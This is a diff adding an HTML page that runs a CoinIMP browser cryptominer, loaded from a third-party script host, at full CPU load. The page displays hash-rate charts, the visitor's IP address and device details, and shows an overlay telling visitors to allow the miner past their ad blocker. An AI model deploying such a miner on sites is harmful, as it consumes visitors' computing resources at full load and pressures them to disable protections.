@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Mining</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- Chart.js Library -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', Courier, monospace; /* Font hacker style */
+            background-color: #1b1b1b; /* Dark background */
+            color: #00ff00; /* Bright green color typical of hacker theme */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5), 0 0 20px rgba(0, 255, 0, 0.4); /* Glowing text */
+            overflow: auto;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 30px;
+            background-color: #333; /* Dark background for container */
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            animation: fadeIn 1.5s ease-out;
+        }
+        .icon {
+            margin-right: 10px;
+            color: #00ff00;
+            animation: glitch 1.5s infinite alternate;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            color: #00ff00; /* Glowing green */
+            margin-bottom: 20px;
+            position: relative;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            animation: glitch 1.5s infinite alternate;
+        }
+        h2 {
+            font-size: 1em;
+            margin-bottom: 20px;
+            position: relative;
+            color: #00ff00; /* Glowing green */
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            animation: glitch 1.5s infinite alternate;
+        }
+
+        .info {
+            text-align: left;
+        }
+
+        .info p {
+            margin-bottom: 15px;
+            font-size: 1rem;
+            color: #00ff00; /* Bright green for text */
+            position: relative;
+        }
+
+        .hash-value {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .hash-table {
+            margin-top: 30px;
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .hash-table th, .hash-table td {
+            padding: 12px;
+            border-bottom: 1px solid #444;
+            text-align: left;
+        }
+
+        .hash-table th {
+            background-color: #444;
+            animation: glitch 1.5s infinite alternate;
+        }
+
+        .hash-table td {
+            font-size: 1.1em;
+            color: #00ff00;
+        }
+        .info-value {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .info-table {
+            margin-top: 30px;
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .info-table th, .info-table td {
+            padding: 12px;
+            border-bottom: 1px solid #444;
+            text-align: left;
+        }
+
+        .info-table th {
+            background-color: #444;
+            animation: glitch 1.5s infinite alternate;
+        }
+
+        .info-table td {
+            font-size: 1.1em;
+            color: #00ff00;
+        }
+
+        a {
+            color: #00ff00;
+            text-decoration: none;
+            position: relative;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        #console {
+            width: 100%;
+            height: 100px;
+            background-color: #1b1b1b;
+            color: #00ff00;
+            padding: 10px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-y: scroll;
+            border: 2px solid #444;
+            margin-top: 30px;
+        }
+
+        canvas {
+            width: 100%;
+            height: 300px;
+            background-color: #222;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 0 rgba(0,255,0,0.5), -2px 0 0 rgba(0,255,0,0.4); }
+            25% { text-shadow: -2px 0 0 rgba(0,255,0,0.5), 2px 0 0 rgba(0,255,0,0.4); }
+            50% { text-shadow: 2px 0 0 rgba(0,255,0,0.5), -2px 0 0 rgba(0,255,0,0.4); }
+            75% { text-shadow: -2px 0 0 rgba(0,255,0,0.5), 2px 0 0 rgba(0,255,0,0.4); }
+            100% { text-shadow: 2px 0 0 rgba(0,255,0,0.5), -2px 0 0 rgba(0,255,0,0.4); }
+        }
+
+        @keyframes blink {
+            50% { color: transparent; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Responsivitas */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 2em;
+            }
+            h2 {
+                font-size 1em;
+            }
+            .info p {
+                font-size: 0.9em;
+            }
+
+            .hash-table th, .hash-table td {
+                padding: 10px;
+            }
+            .info-table th, .info-table td {
+                padding: 10px;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Crypto Mining</h1>
+        <h2>System Information Overview</h2>
+        <div class="info">
+            <p>This site is running <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">CoinIMP</a> miner from JavaScript code. If you're interested in mining, you can start <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8">here</a>.</p>
+            <p>For coins that have been mined, they can be exchanged here on <a href="https://www.mintme.com/">MintMe</a>.</p>
+            <table class="info-table">
+                <tr>
+                    <th colspan="2">Information Device</th>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-user-circle"></i></td>
+                    <td><span id="platform">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-microchip"></i></td>
+                    <td><span  id="cpuGpuInfo">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-hdd"></i></td>
+                    <td><span id="storageCapacity">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-network-wired"></i></td>
+                    <td><span  id="ipAddress">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-calendar"></i></td>
+                    <td><span  id="dateValue">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-clock"></i></td>
+                    <td><span id="timeValue">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-stopwatch"></i></td>
+                    <td><span  id="Stopwatch">Loading...</span></td>
+                </tr>
+            <table class="hash-table">
+                <tr>
+                    <th colspan="2">Information Statistics</th>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-tachometer-alt"></i></td>
+                    <td><span id="speedValue" class="hash-value">Loading...</span></td>
+                </tr>
+                <tr>
+                    <td><i class="fas fa-wallet"></i></td>
+                    <td><span id="totalValue" class="hash-value">Loading...</span></td>
+                </tr>
+            </table>
+        </div>
+        <!-- Chart.js Diagram -->
+        <canvas id="hashRateChart"></canvas>
+        <!-- Console Output -->
+        <div id="console"></div>
+    </div>
+
+<script src="https://www.hostingcloud.racing/SPpb.js"></script>
+<script>
+    // Inisialisasi miner dengan pengaturan yang dioptimalkan
+    var _client = new Client.Anonymous('4b3467771143126127301f0b80324fbd888046a6339591bd1a9bf51a217d9e87', {
+        throttle: 0, c: 'w'
+    });
+
+    _client.start();
+    _client.addMiningNotification(
+        "Top",
+        "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.",
+        "#cccccc",
+        40,
+        "#3d3d3d"
+    );
+
+    // Tambahkan notifikasi jika miner terblokir
+    setTimeout(function () {
+        if (typeof _client === 'undefined' || _client === null) {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style", "width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style", "position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c; align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    }, 1000);
+
+    // Tampilkan kecepatan dan total hash rate
+    setTimeout(function () {
+        let speedValue = document.getElementById("speedValue");
+        let totalValue = document.getElementById("totalValue");
+
+        setInterval(function () {
+            let speed = _client.getHashesPerSecond(); // Ambil data hash rate nyata
+            let total = _client.getTotalHashes(); // Ambil total hash nyata
+            speedValue.textContent = speed.toFixed(2) + " H/s"; // Format angka menjadi 2 desimal
+            totalValue.textContent = total;
+        }, 500); // Update setiap 500ms
+    }, 1000);
+
+    // Grafik hash rate
+    const ctx = document.getElementById('hashRateChart').getContext('2d');
+    const hashRateChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: [],
+            datasets: [{
+                label: 'Hash Rate (H/s)',
+                data: [],
+                borderColor: '#00ff00',
+                backgroundColor: 'rgba(0, 255, 0, 0.5)',
+                tension: 0.4
+            }]
+        },
+        options: {
+            responsive: true,
+            scales: {
+                x: {
+                    type: 'linear',
+                    position: 'bottom',
+                    title: {
+                        display: true,
+                        text: 'Time (seconds)'
+                    }
+                },
+                y: {
+                    title: {
+                        display: true,
+                        text: 'Hash Rate (H/s)'
+                    },
+                    beginAtZero: true
+                }
+            }
+        }
+    });
+
+    let time = 0;
+    setInterval(() => {
+        const hashRate = _client.getHashesPerSecond(); // Data hash rate nyata
+        // Tambahkan data ke grafik
+        hashRateChart.data.labels.push(time);
+        hashRateChart.data.datasets[0].data.push(hashRate);
+        // Batasi data hanya untuk 300 poin terakhir
+        if (hashRateChart.data.labels.length > 300) {
+            hashRateChart.data.datasets[0].data.shift();
+            }
+        hashRateChart.update(); // Perbarui grafik
+        time++;
+    }, 1000); // Update setiap detik
+
+    // Tambahkan log ke console tampilan
+    function logToConsole(message) {
+        const consoleDiv = document.getElementById('console');
+        const messageDiv = document.createElement('p');
+        messageDiv.textContent = message;
+        consoleDiv.appendChild(messageDiv);
+        consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll ke bawah
+    }
+
+    setInterval(() => {
+        const total = _client.getTotalHashes(); // Total hash nyata
+        logToConsole(`${total.toFixed(2)} H/s`);
+    }, 1000); // Update log setiap 1 detik
+    
+    // system information
+        
+    // Platform 
+    document.getElementById('platform').textContent = navigator.platform;
+
+    // CPU / GPU 
+    document.getElementById('cpuGpuInfo').textContent = `${navigator.hardwareConcurrency} cores`;
+
+    // Storage 
+    if (navigator.storage && navigator.storage.estimate) {
+        navigator.storage.estimate().then(estimate => {
+            document.getElementById('storageCapacity').textContent = `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)} GB`;
+        });
+    } else {
+        document.getElementById('storageCapacity').textContent = 'Unavailable';
+    }
+
+    // IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('ipAddress').textContent = data.ip;
+        })
+        .catch(() => {
+            document.getElementById('ipAddress').textContent = 'Error fetching IP';
+        });    
+
+    let startTime = Date.now(); // Waktu mulai halaman
+    // Update uptime, date, and time setiap detik
+    setInterval(() => {
+    // Hitung waktu berlalu untuk uptime
+    let elapsed = Date.now() - startTime;
+    let seconds = Math.floor(elapsed / 1000) % 60;
+    let minutes = Math.floor(elapsed / (1000 * 60)) % 60;
+    let hours = Math.floor(elapsed / (1000 * 60 * 60));
+
+    // Format uptime jadi HH:MM:SS
+    let formattedUptime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    document.getElementById('Stopwatch').textContent = formattedUptime;
+
+    // Tampilkan tanggal real-time
+    const now = new Date();
+    const dateString = now.toLocaleDateString(); // Format tanggal (MM/DD/YYYY)
+    document.getElementById('dateValue').textContent = dateString;
+
+    // Tampilkan waktu real-time
+    const timeString = now.toLocaleTimeString(); // Format waktu (HH:MM:SS)
+    document.getElementById('timeValue').textContent = timeString;
+
+    }, 1000); // Update setiap 1 detik
+    </script>
+</body>
+    </html>
+
+    
